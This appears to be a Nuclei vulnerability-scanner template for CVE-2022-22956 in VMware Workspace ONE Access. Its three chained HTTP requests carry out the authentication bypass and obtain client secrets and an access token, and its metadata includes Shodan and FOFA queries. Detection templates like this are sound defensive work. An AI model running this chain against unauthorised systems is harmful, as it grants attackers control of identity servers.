flow: http(1) && http(2) && http(3)
http:
- extractors:
  - internal: true
    json:
    - .activationToken
    name: activation_token
    type: json
  matchers:
  - condition: and
    dsl:
    - contains_all(body, "activationToken", "_links")
    - contains(header, "application/json")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /SAAS/API/1.0/REST/oauth2/generateActivationToken/Service__OAuth2Client
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 0

    '
- extractors:
  - internal: true
    json:
    - .client_id
    name: client_id
    type: json
  - internal: true
    json:
    - .client_secret
    name: client_secret
    type: json
  matchers:
  - condition: and
    dsl:
    - contains_all(body, "client_id", "client_secret")
    - contains(header, "application/json")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /SAAS/API/1.0/REST/oauth2/activate HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    {{activation_token}}

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "access_token", "token_type")
    - contains(header, "application/json")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /SAAS/auth/oauthtoken HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    grant_type=client_credentials&client_id={{client_id}}&client_secret={{client_secret}}

    '
id: CVE-2022-22956
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:vmware:identity_manager:3.3.3:*:*:*:*:*:*:*
    cve-id: CVE-2022-22956
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.99135
    epss-score: 0.81455
  description: 'VMware Workspace ONE Access has two authentication bypass vulnerabilities
    (CVE-2022-22955 & CVE-2022-22956) in the OAuth2 ACS framework. A malicious actor
    may bypass the authentication mechanism and execute any operation due to exposed
    endpoints in the authentication framework.

    '
  impact: 'Attackers can bypass authentication and perform unauthorized operations,
    potentially leading to full system compromise.

    '
  metadata:
    fofa-query: icon_hash=-1250474341
    max-request: 3
    product: identity_manager
    shodan-query: http.favicon.hash:"-1250474341"
    vendor: vmware
    verified: true
  name: VMware Workspace ONE Access - Authentication Bypass
  reference:
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/vmware_workspace_one_access_vmsa_2022_0011_chain.rb
  - https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22956
  - http://packetstormsecurity.com/files/171918/Mware-Workspace-ONE-Remote-Code-Execution.html
  remediation: 'Apply the latest security patches provided by VMware to address these
    vulnerabilities.

    '
  severity: critical
  tags: cve,cve2022,vmware,workspace,auth-bypass,vkev,vuln
